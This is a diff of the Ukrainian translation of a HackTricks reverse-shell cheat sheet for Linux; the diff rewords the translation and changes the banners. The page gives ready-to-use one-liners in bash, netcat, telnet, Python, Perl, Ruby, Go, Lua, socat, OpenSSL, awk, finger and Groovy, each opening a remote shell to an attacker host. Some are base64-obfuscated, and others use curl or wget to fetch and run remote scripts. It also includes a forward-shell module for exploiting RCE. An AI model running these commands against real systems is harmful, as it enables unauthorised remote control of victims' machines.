@@ -1,20 +1,21 @@
-# Оболонки - Linux
+# Shells - Linux
+
+{% hint style="success" %}
+Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Підтримайте HackTricks</summary>
 
-Інші способи підтримки HackTricks:
-
-* Якщо ви хочете побачити вашу **компанію в рекламі на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
-* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
-* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub**.
+* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.
 
 </details>
+{% endhint %}
 
-**Група з безпеки Try Hard**
+**Спробуйте Hard Security Group**
 
 <figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
@@ -22,11 +23,11 @@
 
 ***
 
-**Якщо у вас є питання щодо будь-яких з цих оболонок, ви можете перевірити їх за допомогою** [**https://explainshell.com/**](https://explainshell.com)
+**Якщо у вас є питання щодо будь-яких з цих оболонок, ви можете перевірити їх на** [**https://explainshell.com/**](https://explainshell.com)
 
-## Повний TTY
+## Full TTY
 
-**Після того, як ви отримаєте зворотню оболонку**[ **прочитайте цю сторінку, щоб отримати повний TTY**](full-ttys.md)**.**
+**Якщо ви отримали реверсну оболонку**[ **прочитайте цю сторінку, щоб отримати повний TTY**](full-ttys.md)**.**
 
 ## Bash | sh
 ```bash
@@ -41,9 +42,9 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-Не забудьте перевірити інші оболонки: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh та bash.
+Не забудьте перевірити з іншими оболонками: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh та bash.
 
-### Безпечна оболонка з символами
+### Символічно безпечна оболонка
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -52,26 +53,26 @@ bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
 #B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
 echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
 ```
-#### Пояснення Shell
+#### Shell explanation
 
-1. **`bash -i`**: Ця частина команди запускає інтерактивний (`-i`) оболонку Bash.
-2. **`>&`**: Ця частина команди є скороченою нотацією для **перенаправлення як стандартного виводу** (`stdout`) так і **стандартної помилки** (`stderr`) до **того ж призначення**.
-3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Це спеціальний файл, який **представляє з'єднання TCP з вказаною IP-адресою та портом**.
-* **Перенаправляючи потік виводу та потік помилок до цього файлу**, команда ефективно відправляє вивід інтерактивної оболонки на машину зловмисника.
-4. **`0>&1`**: Ця частина команди **перенаправляє стандартний ввід (`stdin`) до того ж призначення, що й стандартний вивід (`stdout`)**.
+1. **`bash -i`**: Ця частина команди запускає інтерактивну (`-i`) оболонку Bash.
+2. **`>&`**: Ця частина команди є скороченою нотацією для **перенаправлення як стандартного виходу** (`stdout`), так і **стандартної помилки** (`stderr`) до **одного і того ж місця призначення**.
+3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Це спеціальний файл, який **представляє TCP-з'єднання з вказаною IP-адресою та портом**.
+* Перенаправляючи вихідні та помилкові потоки до цього файлу, команда ефективно надсилає вихід інтерактивної сесії оболонки на машину атакуючого.
+4. **`0>&1`**: Ця частина команди **перенаправляє стандартний вхід (`stdin`) до того ж місця призначення, що й стандартний вихід (`stdout`)**.
 
-### Створити у файлі та виконати
+### Create in file and execute
 ```bash
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
 ```
-## Прямий Shell
+## Forward Shell
 
-При роботі з уразливістю **Remote Code Execution (RCE)** в веб-додатку на основі Linux може бути ускладнено отримання зворотного шелу через захисні мережеві засоби, такі як правила iptables або складні механізми фільтрації пакетів. У таких обмежених середовищах альтернативним підходом є створення PTY (псевдотерміналу) шелу для ефективнішої взаємодії з компромітованою системою.
+Коли ви маєте справу з вразливістю **Remote Code Execution (RCE)** в Linux-базованому веб-додатку, досягнення реверс-шелу може бути ускладнене мережевими захистами, такими як правила iptables або складні механізми фільтрації пакетів. У таких обмежених середовищах альтернативний підхід полягає в створенні PTY (Pseudo Terminal) шелу для більш ефективної взаємодії з скомпрометованою системою.
 
 Рекомендований інструмент для цієї мети - [toboggan](https://github.com/n3rada/toboggan.git), який спрощує взаємодію з цільовим середовищем.
 
-Для ефективного використання toboggan створіть модуль Python, спеціально підганятий під контекст RCE вашої цільової системи. Наприклад, модуль з назвою `nix.py` може бути структурований наступним чином:
+Щоб ефективно використовувати toboggan, створіть модуль Python, адаптований до контексту RCE вашої цільової системи. Наприклад, модуль з назвою `nix.py` може бути структурований наступним чином:
 ```python3
 import jwt
 import httpx
@@ -95,22 +96,21 @@ response.raise_for_status()
 
 return response.text
 ```
-І після цього ви можете запустити:
+А потім ви можете виконати:
 ```shell
 toboggan -m nix.py -i
 ```
-Для безпосереднього використання інтерактивної оболонки. Ви можете додати `-b` для інтеграції з Burpsuite та видалити `-i` для більш простого обгортання rce.
+Щоб безпосередньо використовувати інтерактивну оболонку. Ви можете додати `-b` для інтеграції з Burpsuite і видалити `-i` для більш базового обгортки rce.
 
-
-Ще одна можливість полягає в використанні реалізації прямої оболонки `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
+Ще одна можливість полягає у використанні реалізації форвардної оболонки `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
 Вам просто потрібно змінити:
 
 * URL вразливого хоста
-* Префікс та суфікс вашого навантаження (якщо є)
-* Спосіб надсилання навантаження (заголовки? дані? додаткова інформація?)
+* Префікс і суфікс вашого payload (якщо є)
+* Спосіб відправки payload (заголовки? дані? додаткова інформація?)
 
-Після цього ви можете просто **надсилати команди** або навіть **використовувати команду `upgrade`** для отримання повної PTY (зауважте, що канали читаються та записуються з приблизним затримкою 1,3 с). 
+Тоді ви можете просто **надсилати команди** або навіть **використовувати команду `upgrade`** для отримання повного PTY (зауважте, що канали читаються і записуються з приблизною затримкою 1,3 с).
 
 ## Netcat
 ```bash
@@ -127,21 +127,19 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <
 bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
-
-Telnet - це простий протокол з'єднання, який можна використовувати для віддаленого керування пристроями через мережу.
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
 telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
 rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
 ```
-## Хто
+## Whois
 
-**Атакувальник**
+**Атакуючий**
 ```bash
 while true; do nc -l <port>; done
 ```
-Щоб відправити команду, запишіть її, натисніть Enter і натисніть CTRL+D (щоб зупинити STDIN)
+Щоб надіслати команду, напишіть її, натисніть Enter і натисніть CTRL+D (щоб зупинити STDIN)
 
 **Жертва**
 ```bash
@@ -156,13 +154,11 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
 ```
 ## Perl
-
-Perl - це високорівнева, інтерпретована, динамічна мова програмування.
 ```bash
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
-## Рубі
+## Ruby
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -191,14 +187,10 @@ victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
 attacker> ncat -v 10.0.0.22 4444 --ssl
 ```
 ## Golang
-
-## Голанг
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
 ## Lua
-
-Lua - це легковага, високорівнева мова програмування, яка широко використовується для створення скриптів та розширення функціональності програм. Lua може бути вбудована в інші програми як скриптова мова. Lua використовується в багатьох відомих програмах, таких як World of Warcraft і Adobe Lightroom. Lua має простий синтаксис та потужні можливості, що робить її популярним вибором для розробників.
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -250,7 +242,7 @@ https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
 ## OpenSSL
 
-Атакувальник (Kali)
+Атакуючий (Kali)
 ```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
@@ -268,29 +260,27 @@ openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_cli
 
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
 
-### Прив'язка оболонки
+### Прив'язаний шелл
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
 ```
-### Зворотній shell
+### Реверсна оболонка
 ```bash
 attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
 ## Awk
-
-Awk - це потужний інструмент для обробки тексту в Linux. Він може бути використаний для вибору певних рядків або стовпців з файлу, обчислення значень, форматування виводу та багато іншого.
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
-## Палець
+## Finger
 
-**Атакувальник**
+**Атакуючий**
 ```bash
 while true; do nc -l 79; done
 ```
-Щоб відправити команду, запишіть її, натисніть Enter і натисніть CTRL+D (щоб зупинити STDIN)
+Щоб надіслати команду, напишіть її, натисніть enter і натисніть CTRL+D (щоб зупинити STDIN)
 
 **Жертва**
 ```bash
@@ -299,37 +289,6 @@ export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; s
 export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
 ```
 ## Gawk
-
-### Introduction
-Gawk is a powerful programming language that is used for manipulating text files. It is particularly useful for processing and analyzing data in text files.
-
-### Basic Usage
-To use Gawk, you can simply run the `gawk` command followed by the script file you want to execute. For example:
-```bash
-gawk -f script.awk data.txt
-```
-
-### Useful Features
-- **Pattern Matching**: Gawk allows you to specify patterns to select specific records for processing.
-- **Variables**: You can use variables to store values and perform calculations in Gawk scripts.
-- **Functions**: Gawk provides a variety of built-in functions for string manipulation, mathematical operations, and more.
-- **Output Formatting**: You can control the output format of your data using Gawk's formatting features.
-
-### Examples
-1. Print lines longer than 80 characters:
-```bash
-gawk 'length > 80' data.txt
-```
-
-2. Print the second field of each line:
-```bash
-gawk '{print $2}' data.txt
-```
-
-3. Calculate the total sum of the first column:
-```bash
-gawk '{sum+=$1} END {print sum}' data.txt
-```
 ```bash
 #!/usr/bin/gawk -f
 
@@ -354,49 +313,50 @@ close(Service)
 ```
 ## Xterm
 
-Це спробує підключитися до вашої системи на порт 6001:
+Це спробує підключитися до вашої системи на порту 6001:
 ```bash
 xterm -display 10.0.0.1:1
 ```
-Для отримання зворотньої оболонки можна використовувати (яка буде слухати на порту 6001):
+Щоб зловити реверс-оболонку, ви можете використовувати (яка буде слухати на порту 6001):
 ```bash
 # Authorize host
 xhost +targetip
 # Listen
 Xnest :1
 ```
-## Груві
+## Groovy
 
-автор [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) ПРИМІТКА: Java зворотний shell також працює для Груві
+by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) ЗАУВАЖЕННЯ: Java reverse shell також працює для Groovy
 ```bash
 String host="localhost";
 int port=8044;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
-## Посилання
+## References
 
 * [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 * [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
 * [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
-**Група з безпеки Try Hard Security**
+**Try Hard Security Group**
 
 <figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
+{% hint style="success" %}
+Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Підтримайте HackTricks</summary>
 
-Інші способи підтримки HackTricks:
-
-* Якщо ви хочете побачити вашу **компанію рекламовану в HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
-* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
-* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub**.
+* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.
 
 </details>
+{% endhint %}
